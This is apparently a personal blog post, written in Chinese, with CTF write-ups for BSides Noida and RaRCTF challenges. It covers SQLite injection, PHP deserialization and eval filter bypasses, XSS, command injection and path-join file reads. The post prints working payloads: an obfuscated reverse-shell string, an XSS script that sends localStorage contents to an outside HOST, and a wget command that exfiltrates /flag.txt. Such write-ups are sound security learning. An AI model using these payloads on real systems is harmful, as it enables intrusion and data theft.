---
butterId: mixin // blog image bucket id [Don't remove]
---

# Week9 Summary

## What have I done

- BSides Noida CTF 复现
- RaRCTF 整理复现中

## [WriteUp] How did I accomplish these things

### Web

#### Baby Web

> Just a place to see list of all challs from bsides noida CTF, maybe some flag too xD
> Note : Bruteforce is not required.

题目给出的是一个 SQLite 注入点，但是 Nginx 禁用了所有字母。根据给出的附件可知根目录下有 `karma.db`，访问到 `/karma.db` 将其下载下来。使用 SQLite Expert 读取即可得到 flag。

![](https://api.lemonprefect.cn/image/hdslb/archive/824f1fae-1c61-4acb-8561-3e2bcd829477/1628492691729899/778de3c107ceaff1a2882396a0f81a783dd28c4c.png)

```flag
BSNoida{4_v3ry_w4rm_w31c0m3_2_bs1d35_n01d4}
```

#### Baby Web Revenge

> So close yet so far

再来审视一下 Nginx 的过滤。

```nginx
if($arg_chall_id ~ [A-Za-z_.%]){
	return 500;
}
```

这里其实只看了参数 chall_id，但是因为后端是 PHP，所以 chall.id 实际上也会被 PHP 解析成 chall_id。但是到 Nginx 时却不会被这么处理，因此得以绕过 Nginx 的过滤。结合后端是 SQLite，使用如下载荷即可读取信息。

```sqlite
chall.id=1/**/union/**/select/**/group_concat(sql),2,3,4,5,6/**/from/**/sqlite_master
```

得到如下表结构，进而尝试读取 flag。

```sqlite
CREATE TABLE CTF(
    id INteger AUTO_INCREMENT,
    title varchar(255) not NULL,
    description varchar(255) not NULL,
    category varchar(255) not NULL,
    author varchar(255) not NULL,
    points int NOT NULL),
CREATE TABLE therealflags(
    id int AUTO_INCREMENT,
    flag varchar(255) not NULL)
```

构造出如下载荷读取 flag。

```sqlite
chall.id=1/**/union/**/select/**/flag,2,3,4,5,6/**/from/**/therealflags
```

```flag
BSNoida{4_v3ry_w4rm_w31c0m3_2_bs1d35_n01d4_fr0m_4n_1nt3nd3d_s01ut10nxD}
```

#### wowooo

> it's really interesting
> Note : Bruteforce is not required.

根据页面源码注释的提示提交 GET 参数 `debug` 即可得到如下代码。

```php+HTML
<?php
include 'flag.php';
function filter($string){
    $filter = '/flag/i';
    return preg_replace($filter,'flagcc',$string);
}
$username=$_GET['name'];
$pass="V13tN4m_number_one";
$pass="Fl4g_in_V13tN4m";
$ser='a:2:{i:0;s:'.strlen($username).":\"$username\";i:1;s:".strlen($pass).":\"$pass\";}";

$authen = unserialize(filter($ser));

if($authen[1]==="V13tN4m_number_one "){
    echo $flag;
}
if (!isset($_GET['debug'])) {
    echo("PLSSS DONT HACK ME!!!!!!").PHP_EOL;
} else {
    highlight_file( __FILE__);
}
?>
<!-- debug -->
```

很明显是少变多的反序列化逃逸，逃逸点在变量 username 处由四个字符变为六个字符。先构造出要逃逸达成的部分。

```plain text
";i:1;s:19:"V13tN4m_number_one ";}
```

一共 34 个字符，因此此时需要替换 17 次才能完成逃逸，构造出如下载荷。

```plain text
flagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflag";i:1;s:19:"V13tN4m_number_one ";}
```

以 GET 参数 name 发起请求即可得到 flag。

```flag
BSNoida{3z_ch4all_46481684185_!!!!!!@!}
```

#### freepoint

> i hate php >.<
> Note : Bruteforce is not required.

题目给出的代码如下。

```php
<?php

include "config.php";
function filter($str) {
    if(preg_match("/system|exec|passthru|shell_exec|pcntl_exec|bin2hex|popen|scandir|hex2bin|[~$.^_`]|\'[a-z]|\"[a-z0-9]/i",$str)) {
        return false;
    } else {
        return true;
    }
}
class BSides {
    protected $option;
    protected $name;
    protected $note;

    function __construct() {
        $option = "no flag";
        $name = "guest";
        $note = "flag{flag_phake}";
        $this->load();
    }

    public function load()
    {
        if ($this->option === "no flag") {
            die("flag here ! :)");
        } else if ($this->option === "getFlag"){
            $this->loadFlag();
        } else {
            die("You don't need flag ?");
        }
    }
    private function loadFlag() {
        if (isset($this->note) && isset($this->name)) {
            if ($this->name === "admin") {
                if (filter($this->note) == 1) {
                    eval($this->note.";");
                } else {
                    die("18cm30p !! :< ");
                }
            }
        }
    }

    function __destruct() {
        $this->load();
    }
}

if (isset($_GET['ctf'])) {
    $ctf = (string)$_GET['ctf'];
    if (check($ctf)) {
        unserialize($ctf);
    }
} else {
    highlight_file(__FILE__);
}
?>
```

可以发现只需要控制 option 为 getFlag，name 为 admin 即可进入到 note 的执行。由于这里进行了诸多限制，考虑使用十六进制和字符串反向绕过。构造出如下 payload 来读取 PHPINFO。

```plain text
O:6:"BSides":3:{s:6:"option";s:7:"getFlag";s:4:"name";s:5:"admin";s:4:"note";s:27:"eval(strrev(";)(ofniphp"));";}
```

可以发现在 disable_function 处没有禁用任何函数，因此直接一把梭反弹 shell。

```plain text
O:6:"BSides":3:{s:6:"option";s:7:"getFlag";s:4:"name";s:5:"admin";s:4:"note";s:139:"eval(strrev(";))'221362e3030253532333f2031323e283e2633313e283f2073647f2675646f20262e30296d20286371626220236d20286371626'(nib2xeh(metsys"));";}
```

反弹 shell 在 /home 下读到 fl4g_ne_xxx.txt 即为 flag。

```flag
BSNoida{Fre3_fl4g_f04_y0u_@@55361988!!!}
```

#### Calculate

> Are you a math prodigy? hehe

根据页面源码中的提示加上 🐶 为 key 的 GET 参数即可得到相对完整的源码。

```php
<?php
if(isset($_GET['🐶'])) {
    highlight_file(__FILE__);
}
function filter($payload) {
    if (preg_match("/[a-zA-BD-Z!@#%^&*:'\"|`~\\\\]|3|5|6|9/",$payload)) {
        return true;
    }
}
?>
<!-- ?🐶 -->
<?php
error_reporting(0);
include "config.php";

if (isset($_POST['VietNam'])) {
    $VN = $_POST['VietNam'];
    if (filter($VN)) {
        die("nope!!");
    }
    if (!is_string($VN) || strlen($VN) > 110) {
        die("18cm30p ??? =)))");
    }
    else {
        $VN = "echo ".$VN.";";
        eval($VN);
    }
} else {
    if (isset($_GET['check'])) {
        echo phpinfo();
    }
    else {
        highlight_file(__FILE__);
    }
}
?>
```

此时就相当于构造一个字母和部分数字的限定长度的 shell，先用 check 参数看一眼 disable_functions。发现 chr 函数和 exec 函数仍然在，因此只需要利用 exec 去进行 RCE，chr 进行被禁用的字符生成即可。构造出如下载荷。

```php
$_=C,$C=((1/0).C)[2],$C++,$C++,$_.=$C,$_.=([].C)[2],$C=$_(70-1),($C.$_(120).$C.C)(${_.$_(71).$C.$_(84)}[_]);
```

载荷将执行 GET 参数 _ 的值，因此将反弹 shell 放在 GET 参数 _ 中，再将载荷以 POST 参数 VietNam 提交即可达成目的。在 shell 中读取 /home/fl4g_h1hih1i_xxx.txt 即可得 flag。


```flag
BSNoida{w0w_gr3at_Th4nk_y0u_f0r_j0in1ng_CTF_!!!!!!}
```

#### Fancy Button Generator

> Check out this cool new fancy button generator! The buttons even glow!

将给出的附件源码下载，可以很明显看出这是一个 XSS 的题目，同时使用了一个工作量证明（Proof Of Work）的验证机制。

> Proof of work: https://en.wikipedia.org/wiki/Proof_of_work

题目的附件中给出了其计算方法。

```python
def generate():
    return uuid.uuid4().hex[:4], uuid.uuid4().hex[:4]


def verify(prefix, suffix, answer, difficulty=6):
    hash = hashlib.sha256(prefix.encode() + answer.encode() + suffix.encode()).hexdigest()
    return hash.endswith("0" * difficulty)


def solve(prefix, suffix, difficulty):
    while True:
        test = binascii.hexlify(os.urandom(4)).decode()
        if verify(prefix, suffix, test, difficulty):
            return test
```

因此只需要先请求获得前缀和后缀，Solve 完成之后提交数据即可获得一次发送按钮的权力。再来看 admin 是如何操作按钮的，在给出的附件中有如下代码。

```javascript
await page.evaluate(flag => {
        localStorage.flag = flag;
    }, process.env.FLAG);

    let url = process.env.SITE + "button?title=" + req.title + "&link=" + req.link;
    console.log("Going to ", url);
    await page.goto(url, {
        waitUntil: "networkidle2"
    });
    await page.click("#btn");
    await page.waitForTimeout(TIMEOUT);
    await page.close();
    page = null;
```

很容易发现 admin 其实是直接点击了按钮，然后等了一下就关闭了页面。那么此时只需要对按钮进行 XSS 即可。使用 `javascript:alert(1)` 可以达成点击按钮后弹窗的效果。因此可以在 GET 参数 link 处进行 XSS 来尝试取出 localStorage.flag 然后发起一次对外的请求来获取 flag。构造出如下脚本来进行 XSS。

```python
session = requests.session()
host = "https://fbg.rars.win/"
data = session.get(host + "pow").json()
solution = solve(data['pref'], data['suff'], 5)
print(f"Solved POW: {solution} with prefix {data['pref']} suffix {data['suff']}")
session.post(host + "pow", json={"answer": solution})
name = ""
link = "javascript:window.location.replace('http://HOST/?flagis-'%252BlocalStorage.getItem('flag'))"
response = session.get(host + f"admin?title={name}&link={link}")
print(response.text)
```

运行脚本即可在端口监听处得到如下请求数据，从而可以得到 flag。

```http
GET /?flagis-rarctf{th0s3_f4ncy_butt0n5_w3r3_t00_cl1ck4bl3_f0r_u5_a4667cb69f} HTTP/1.1
Host: 8.136.8.210:3255
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/92.0.4515.107 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US
```

```flag
rarctf{th0s3_f4ncy_butt0n5_w3r3_t00_cl1ck4bl3_f0r_u5_a4667cb69f}
```

#### lemonthinker

> generate your lemonthinks here!
>
> Note: All characters that look like a `O` are actually a `0`, please  try replacing all `O`'s with  `0`'s if you find that your flag does not work.

题目给出的源代码如下。

```python
from flask import Flask, request, redirect, url_for
import os
import random
import string
import time # lemonthink

clean = time.time()
app = Flask(__name__)
chars = list(string.ascii_letters + string.digits)

@app.route('/')
def main():
    return open("index.html").read()

@app.route('/generate', methods=['POST'])
def upload():
    global clean
    if time.time() - clean > 60:
      os.system("rm static/images/*")
      clean = time.time()
    text = request.form.getlist('text')[0]
    text = text.replace("\"", "")
    filename = "".join(random.choices(chars,k=8)) + ".png"
    os.system(f"python3 generate.py {filename} \"{text}\"")
    return redirect(url_for('static', filename='images/' + filename), code=301)
  
if __name__ == "__main__":
  app.run("0.0.0.0",1002)
```

此时可以看出有一个参数可控，只需要传入 text 即可进行 RCE。构造出如下载荷读取文件 /flag.txt 并使用 wget 带出，靶机似乎没有 curl。

```bash
$(cat /flag.txt | xargs -I{} wget "http://HOST/?flagis-{}")
```

载荷发送后在监听端可以得到如下请求数据，即得到 flag。

```http
GET /?flagis-rarctf{b451c-c0mm4nd_1nj3ct10n_f0r-y0u_4nd_y0ur-l3m0nth1nk3rs_d8d21128bf} HTTP/1.1
Host: 8.136.8.210:3255
User-Agent: Wget
Connection: close
```

```flag
rarctf{b451c-c0mm4nd_1nj3ct10n_f0r-y0u_4nd_y0ur-l3m0nth1nk3rs_d8d21128bf}
```

#### Secure Uploader

> A new secure, safe and smooth uploader!

题目所给出的上传和访问路由的代码如下。

```python
@app.route('/upload', methods=['POST'])
def upload():
    if 'file' not in request.files:
        return redirect('/')
    file = request.files['file']
    if "." in file.filename:
        return "Bad filename!", 403
    conn = db()
    cur = conn.cursor()
    uid = uuid.uuid4().hex
    try:
        cur.execute("insert into files (id, path) values (?, ?)", (uid, file.filename,))
    except sqlite3.IntegrityError:
        return "Duplicate file"
    conn.commit()
    file.save('uploads/' + file.filename)
    return redirect('/file/' + uid)

@app.route('/file/<id>')
def file(id):
    conn = db()
    cur = conn.cursor()
    cur.execute("select path from files where id=?", (id,))
    res = cur.fetchone()
    if res is None:
        return "File not found", 404
    with open(os.path.join("uploads/", res[0]), "r") as f:
        return f.read()
```

可以发现文件上传之后会生成一个 id，然后访问的时候只通过这个 id 进行文件读取。上传时文件名中不允许有 . 字符，而其他的字符通通没有处理，因此不能目录穿越读文件。再看访问的路由，使用了 `os.path.join` 来将文件名与路径拼接从而进行读取。在这个方法的文档中有如下一句话。

> If a component is an absolute path, all previous components are thrown away and joining continues from the absolute path component.

假设此时的 `res[0]` 变成了绝对路径，也就是 `/flag`，那么此前的所有路径就会被抛弃，进而读取到根目录下的 flag。因此构造出如下两个请求来获取 flag。

```http
POST /upload HTTP/1.1
Host: 193.57.159.27:35294
Content-Length: 282
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary51X6ZmnbrL0hXAYM
Connection: close

------WebKitFormBoundary51X6ZmnbrL0hXAYM
Content-Disposition: form-data; name="file"; filename="/flag"
Content-Type: image/png


------WebKitFormBoundary51X6ZmnbrL0hXAYM
Content-Disposition: form-data; name="submit"

Upload File
------WebKitFormBoundary51X6ZmnbrL0hXAYM--

```

```http
GET /file/d129a262e4724c549cda37a51755e1bf HTTP/1.1
Host: 193.57.159.27:35294
Connection: close


```

在使用第一个请求获得的链接请求访问文件后可获得 flag。

```flag
rarctf{4lw4y5_r34d_th3_d0c5_pr0p3rly!-71ed16}
```

### Misc

#### Farewell

>"You might be alone at the moment... 
>But someday... You'll definitely find nakama! 
>No one is born in this world to be alone!"
>― Eiichiro Oda

拼图小游戏，在请求中可以找到原图，可以直接读出 flag。

![](https://api.lemonprefect.cn/image/hdslb/archive/824f1fae-1c61-4acb-8561-3e2bcd829477/1628504234060552/f5027eccc0e5926c867ad5cce52e6d632ebc7b34.jpg)

```flag
BSNoida{Th4nk5_f0rpl4y1ng_See_y0u_n3xty34rBy3}
```

#### Psst

> Psst! Want to know a secret? Here, take this...

使用 gzip -d psst.tar.gz 和 tar -xf psst.tar 依次解压后写个脚本进行遍历。这里不能使用 Windows 来运行脚本，因为有文件夹的最后一个字符为 `.`。

```python
import os
flag = ""
message = ""
path = "./chall/Security"
while True:
    files = os.listdir(path)
    print(files)
    if len(files) == 1:
        flag += open(f"{path}/{files[0]}", "r").read().strip()
        break
    if "txt" in files[0]:
        files.reverse()
    message += f"{files[0]} "
    flag += open(f"{path}/{files[1]}", "r").read().strip()
    path += f"/{files[0]}"
print(message)
print(flag)
```

运行脚本后可以得到一段话和 flag。

```plain text
BSides is a community-based framework for organizing events and informing members of the public about information security. These events are already happening in major cities around the world! We are responsible for organizing an independent BSides event approved in Noida, India. It creates opportunities for people to be present and participate in an intimate environment that promotes collaboration. It is a lively event with discussions, demos, and participants' interactions.
```

```flag
BSNoida{d1d_y0u_u53_b45h_5cr1pt1ng_6f7220737461636b6f766572666c6f773f}
```

#### My Artwork

> "You can create art and beauty with a computer." - Steven Levy
> So, I decided not to use MS Paint anymore and write code instead!
> Hope you can see my art before the turtle runs away!
> He's pretty fast tbh!
> PS: Put the flag in BSNoida{} wrapper.

将附件下载下来，使用 FMSLogo 逐条指令执行即可得到通过绘画读出如下字符串。

```plain text
CODE_IS_BEAUTY_BEAUTY_ISCODE
```

按照提示将字符串包裹即可得 flag。

```flag
BSNoida{CODE_IS_BEAUTY_BEAUTY_ISCODE}
```

## Summary

比赛在复现，直播分享也有在准备啦。
